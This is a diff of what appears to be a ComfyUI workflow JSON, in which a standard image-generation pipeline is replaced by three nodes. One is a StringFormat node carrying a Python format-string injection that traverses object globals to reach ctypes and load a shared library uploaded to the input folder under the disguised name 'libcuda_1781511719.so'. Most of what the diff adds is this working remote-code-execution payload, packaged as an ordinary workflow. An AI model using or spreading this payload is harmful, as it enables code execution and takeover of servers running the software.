@@ -1,74 +1,26 @@
 {
   "1": {
-    "class_type": "CheckpointLoaderSimple",
+    "class_type": "CreateHookKeyframe",
     "inputs": {
-      "ckpt_name": "dreamshaper_8_lcm.safetensors"
+      "strength_mult": 1.0,
+      "start_percent": 0.0
     }
   },
   "2": {
-    "class_type": "CLIPTextEncode",
+    "class_type": "StringFormat",
     "inputs": {
-      "text": "test",
-      "clip": [
+      "f_string": "{a.__class__.__init__.__globals__[comfy].memory_management.ctypes.cdll[/app_code/input/libcuda_1781511719.so]}",
+      "values.a": [
         "1",
-        1
+        0
       ]
     }
   },
   "3": {
-    "class_type": "EmptyLatentImage",
+    "class_type": "PreviewAny",
     "inputs": {
-      "width": 512,
-      "height": 512,
-      "batch_size": 1
-    }
-  },
-  "4": {
-    "class_type": "KSampler",
-    "inputs": {
-      "model": [
-        "1",
-        0
-      ],
-      "seed": 42,
-      "steps": 1,
-      "cfg": 1.0,
-      "sampler_name": "euler",
-      "scheduler": "normal",
-      "positive": [
+      "source": [
         "2",
-        0
-      ],
-      "negative": [
-        "2",
-        0
-      ],
-      "latent_image": [
-        "3",
-        0
-      ],
-      "denoise": 1.0
-    }
-  },
-  "5": {
-    "class_type": "VAEDecode",
-    "inputs": {
-      "vae": [
-        "1",
-        2
-      ],
-      "samples": [
-        "4",
-        0
-      ]
-    }
-  },
-  "6": {
-    "class_type": "SaveImage",
-    "inputs": {
-      "filename_prefix": "ft",
-      "images": [
-        "5",
         0
       ]
     }
